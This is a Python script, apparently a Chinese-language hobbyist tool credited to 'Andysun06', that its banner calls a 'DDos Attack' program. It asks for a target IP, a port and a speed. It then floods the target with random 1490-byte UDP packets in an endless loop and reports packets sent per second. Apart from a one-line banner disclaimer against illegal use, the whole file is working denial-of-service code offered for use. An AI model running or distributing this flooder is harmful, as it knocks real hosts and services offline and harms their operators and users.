import os
import time
import socket
import random
from datetime import datetime

# 获取当前时间，日志输出可以用到
now = datetime.now()

# 清理屏幕并显示程序信息
def display_info():
    """显示程序信息和警告"""
    os.system("clear")
    os.system("figlet DDos Attack")
    print(" ")
    print("/---------------------------------------------------\\")
    print("|   作者          : Andysun06                       |")
    print("|   作者github    : https://github.com/Andysun06    |")
    print("|   kali-QQ学习群 : 909533854                       |")
    print("|   版本          : V1.1.0                          |")
    print("|   严禁转载，程序教程仅发布在CSDN（用户Andysun06）   |")
    print("\\---------------------------------------------------/")
    print(" ")
    print(" -----------------[请勿用于违法用途]----------------- ")

# 用户输入信息
def get_user_input():
    """获取用户输入的目标 IP、端口和攻击速度"""
    ip = input("请输入 IP     : ")
    port = int(input("攻击端口      : "))
    while True:
        try:
            sd = int(input("攻击速度(1~1000) : "))
            if 1 <= sd <= 1000:
                break
            else:
                print("请输入1到1000之间的数值")
        except ValueError:
            print("请输入一个有效的数字")
    return ip, port, sd

# 创建并初始化 socket 和随机字节
def create_socket():
    """创建 UDP socket 并生成随机字节数据"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return sock, random._urandom(1490)

# 打印每秒发送的数据包数量
def print_stats(sent):
    """每秒打印已发送数据包的数量"""
    print(f"已发送 {sent} 个数据包")

# 主函数，控制数据包的发送
def send_packets(sock, bytes, ip, port, sd):
    """发送数据包到指定 IP 和端口"""
    sent = 0
    start_time = time.time()  # 记录开始时间
    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1

            # 每秒打印一次已发送数据包数
            if time.time() - start_time >= 1:
                print_stats(sent)
                start_time = time.time()  # 重置开始时间

            # 根据攻击速度调整间隔时间
            time.sleep((1000 - sd) / 2000)

    except KeyboardInterrupt:
        print("\n攻击中止。已发送数据包总数:", sent)
    except Exception as e:
        print(f"发生错误: {e}")

# 程序入口
def main():
    """主程序入口"""
    display_info()
    ip, port, sd = get_user_input()
    sock, bytes = create_socket()
    send_packets(sock, bytes, ip, port, sd)

if __name__ == "__main__":
    main()
